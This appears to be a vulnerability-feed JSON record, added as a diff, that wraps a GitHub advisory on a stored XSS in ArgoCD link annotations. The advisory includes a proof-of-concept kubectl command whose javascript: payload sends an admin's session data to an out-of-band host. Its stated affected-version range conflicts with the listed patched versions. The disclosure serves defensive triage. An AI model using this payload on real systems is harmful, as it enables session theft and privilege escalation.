@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"author\": null, \"closed_at\": null, \"collaborating_teams\": null, \"collaborating_users\": null, \"created_at\": null, \"credits\": [{\"login\": \"kah-ja\", \"type\": \"reporter\"}], \"credits_detailed\": [{\"state\": \"accepted\", \"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/36455663?v=4\", \"events_url\": \"https://api.github.com/users/kah-ja/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/kah-ja/followers\", \"following_url\": \"https://api.github.com/users/kah-ja/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/kah-ja/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/kah-ja\", \"id\": 36455663, \"login\": \"kah-ja\", \"node_id\": \"MDQ6VXNlcjM2NDU1NjYz\", \"organizations_url\": \"https://api.github.com/users/kah-ja/orgs\", \"received_events_url\": \"https://api.github.com/users/kah-ja/received_events\", \"repos_url\": \"https://api.github.com/users/kah-ja/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/kah-ja/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/kah-ja/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/kah-ja\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45738\", \"cvss\": {\"score\": 7.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": null, \"vector_string\": null}}, \"cwe_ids\": [\"CWE-79\"], \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}], \"description\": \"### Summary\\r\\n\\r\\nA user with **application write access (developer role)** can set `link.argocd.argoproj.io/*` annotations on any ArgoCD Application. These annotation values are rendered in the Summary tab's **URLs section** as `<a href>` elements without URL validation. Using the pipe-separator trick (`Display Text | javascript:...`), an attacker can inject a `javascript:` URI while displaying a legitimate-looking label (e.g. `GitHub Repo`). When a higher-privileged user (admin) clicks the link, **arbitrary JavaScript executes in the ArgoCD origin context** in the admin's authenticated session context, enabling API exfiltration and privilege escalation from developer to admin.\\r\\n\\r\\n### Details\\r\\n\\r\\n**Vulnerable sink:** `ui/src/app/applications/components/application-summary/application-summary.tsx:277`\\r\\n\\r\\n```tsx\\r\\nconst parts = (url || '').split('|');\\r\\n<a key={i} href={parts.length > 1 ? parts[1] : parts[0]} target='_blank'>\\r\\n    {parts[0]}\\r\\n</a>\\r\\n```\\r\\n\\r\\nThe annotation value is split on `|`. `parts[0]` becomes the visible link label; `parts[1]` becomes the `href`. **No call to `isValidURL()` is made**, unlike the protected `ApplicationURLs` component (`application-urls.tsx:72,80`) which does validate URLs and blocks `javascript:`. The `target='_blank'` opens a new tab that inherits the ArgoCD origin, giving the injected script same-origin fetch access to all ArgoCD APIs using the victim's authenticated session (credentialed `fetch()` calls).\\r\\n\\r\\n**Root cause:** React 16.x does not block `javascript:` URIs in `href` attributes (this protection was added in React 19). The helper `isValidURL()` exists in `shared/utils.ts` but is **not applied** to this sink.\\r\\n\\r\\n**CSP:** ArgoCD's default Content Security Policy is `frame-ancestors 'self'` only — no `script-src`, no `connect-src`, no `default-src` — providing **zero XSS execution mitigation**.\\r\\n\\r\\n### PoC\\r\\n\\r\\n**Prerequisites:** Developer role with application write access (e.g. RBAC: `p, role:developer, applications, *, */*, allow`).\\r\\n\\r\\n**Step 1 — Set malicious annotation as developer:**\\r\\n\\r\\n```bash\\r\\nkubectl annotate application <app-name> -n argocd \\\\\\r\\n  'link.argocd.argoproj.io/docs=GitHub Repo|javascript:fetch(\\\"https://<argocd-host>/api/v1/session/userinfo\\\",{credentials:\\\"include\\\"}).then(r=>r.json()).then(d=>fetch(\\\"https://xxx.oastify.com/?d=\\\"+btoa(JSON.stringify(d)),{mode:\\\"no-cors\\\"}))'\\r\\n```\\r\\n\\r\\nThe URL section in the admin's Summary tab renders the link as **\\\"GitHub Repo\\\"** — the `javascript:` payload is invisible in the displayed text.\\r\\n\\r\\n**Step 2 — Admin opens Summary tab** of the annotated application and clicks the link.\\r\\n\\r\\n**Step 3 — JavaScript executes** at the ArgoCD origin and exfiltrates admin session data via out-of-band HTTP request. Tested with Burp Collaborator:\\r\\n\\r\\n```javascript\\r\\n// Payload used during testing (Burp Collaborator OOB):\\r\\nfetch(\\\"https://<argocd-host>/api/v1/session/userinfo\\\", {credentials:\\\"include\\\"})\\r\\n  .then(r => r.json())\\r\\n  .then(d => fetch(\\\"https://xxx.oastify.com/?d=\\\" + btoa(JSON.stringify(d)), {mode:\\\"no-cors\\\"}))\\r\\n```\\r\\n\\r\\n**Step 4 — Burp Collaborator received the OOB HTTP interaction** containing the base64-encoded admin session data. Decoded response:\\r\\n\\r\\n```json\\r\\n{\\\"iss\\\":\\\"argocd\\\",\\\"loggedIn\\\":true,\\\"username\\\":\\\"admin\\\"}\\r\\n```\\r\\n\\r\\n**Tested on:** ArgoCD v3.3.8 (commit 0850e97), React 16.9.3.\\r\\n\\r\\n### Impact\\r\\n\\r\\n- **Stored XSS** — payload persists in the Kubernetes Application resource until manually removed\\r\\n- **Privilege escalation** — developer role → admin session hijacking via authenticated API calls\\r\\n- **Maximum stealth** — the injected link displays as any attacker-chosen text; the `javascript:` href is never visible to the victim\\r\\n- **No server-side interaction required** — purely client-side exploit, no network egress needed for execution (exfiltration uses `no-cors` fetch, bypassed by absent `connect-src` CSP)\\r\\n- Any admin or operator who views the Summary tab of the compromised application is affected\\r\\n\\r\\n### Credits\\r\\n\\r\\nDiscovered and reported by **Jan Kahmen** ([jan@turingpoint.de](mailto:jan@turingpoint.de)) — [turingpoint.de](https://turingpoint.de)\", \"ghsa_id\": \"GHSA-h98r-wv3h-fr38\", \"html_url\": \"https://github.com/argoproj/argo-cd/security/advisories/GHSA-h98r-wv3h-fr38\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-h98r-wv3h-fr38\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45738\"}], \"private_fork\": null, \"published_at\": \"2026-05-13T17:59:47Z\", \"publisher\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/350466?v=4\", \"events_url\": \"https://api.github.com/users/crenshaw-dev/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/crenshaw-dev/followers\", \"following_url\": \"https://api.github.com/users/crenshaw-dev/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/crenshaw-dev/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/crenshaw-dev\", \"id\": 350466, \"login\": \"crenshaw-dev\", \"node_id\": \"MDQ6VXNlcjM1MDQ2Ng==\", \"organizations_url\": \"https://api.github.com/users/crenshaw-dev/orgs\", \"received_events_url\": \"https://api.github.com/users/crenshaw-dev/received_events\", \"repos_url\": \"https://api.github.com/users/crenshaw-dev/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/crenshaw-dev/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/crenshaw-dev/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/crenshaw-dev\", \"user_view_type\": \"public\"}, \"severity\": \"high\", \"state\": \"published\", \"submission\": null, \"summary\": \"Stored XSS in application link annotations enables developer-to-admin privilege escalation\", \"updated_at\": \"2026-05-13T17:59:48Z\", \"url\": \"https://api.github.com/repos/argoproj/argo-cd/security-advisories/GHSA-h98r-wv3h-fr38\", \"vulnerabilities\": [{\"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/argoproj/argo-cd\"}, \"patched_versions\": \"3.2.12, 3.3.10, 3.4.2\", \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 3.0.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "argo-project:ghsa-h98r-wv3h-fr38",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/argoproj/argo-cd: < 3.0.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-45738"
+    ],
+    "cvss_score": 7.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N",
+    "fixed_versions": [
+      "github.com/argoproj/argo-cd: 3.2.12, 3.3.10, 3.4.2"
+    ],
+    "mitigations": [],
+    "products": [
+      "github.com/argoproj/argo-cd"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-17T23:39:57.182183Z",
+  "provenance": {
+    "content_sha256": "78aa9b1a368c4a42e1b312174ad4c3673400a0a691d5dfadc49944518e41d395",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-13T17:59:47Z",
+  "schema_version": 1,
+  "source_id": "argo_cd_github",
+  "source_url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-h98r-wv3h-fr38",
+  "status": "active",
+  "title": "Stored XSS in application link annotations enables developer-to-admin privilege escalation",
+  "updated_at": "2026-05-13T17:59:48Z",
+  "vendor": "Argo Project",
+  "vendor_advisory_id": "GHSA-h98r-wv3h-fr38"
+}
